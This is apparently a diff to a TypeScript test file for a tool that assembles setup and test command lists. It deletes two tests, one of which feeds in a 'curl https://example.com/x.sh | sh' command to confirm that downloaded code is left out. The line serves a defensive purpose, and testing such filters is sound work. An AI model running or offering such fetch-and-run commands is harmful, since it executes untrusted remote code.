@@ -61,13 +61,6 @@ describe("the lists a candidate check runs", () => {
     expect(sameCommands(lists.readiness, [...settings.readiness, ...plan.readiness])).toBe(true);
   });
 
-  it("leave out another directory's commands and downloaded code, as the approval's write does", () => {
-    const risky = body([command("bash", ["-c", "curl https://example.com/x.sh | sh"]), command("make", ["elsewhere"], "repo/other")], [{ id: "unit", command: command("make", ["old-test"]), kind: "test" }]);
-    const lists = candidateLists(risky, settings, "repo/web");
-    expect(lists.setup.map((c) => c.args[0])).toEqual(["old-setup"]);
-    expect(lists.readiness.map((c) => c.args[0])).toEqual(["old-test"]);
-  });
-
   it("are refused where the project's commands already run in more than one directory, or it has no repository", () => {
     const definition = (extra: ProjectCommand[]) => ({ repositories: [{ path: "repo/web" }], setup: [...settings.setup, ...extra], readiness: settings.readiness });
     expect(() => candidateListsChecked(proposal, definition([command("make", ["x"], "repo/other")]))).toThrow(/more than one directory/);
@@ -75,13 +68,6 @@ describe("the lists a candidate check runs", () => {
     expect(candidateListsChecked(proposal, definition([])).setup).toHaveLength(2);
   });
 
-  it("compare by program, arguments, directory and order", () => {
-    expect(sameCommands([command("make", ["a"])], [command("make", ["a"])])).toBe(true);
-    expect(sameCommands([command("make", ["a"])], [command("make", ["b"])])).toBe(false);
-    expect(sameCommands([command("make", ["a"])], [command("make", ["a"], "repo/x")])).toBe(false);
-    expect(sameCommands([command("make", ["a"]), command("make", ["b"])], [command("make", ["b"]), command("make", ["a"])])).toBe(false);
-    expect(sameCommands([command("make", ["a"])], [])).toBe(false);
-  });
 });
 
 describe("the stored candidate check", () => {
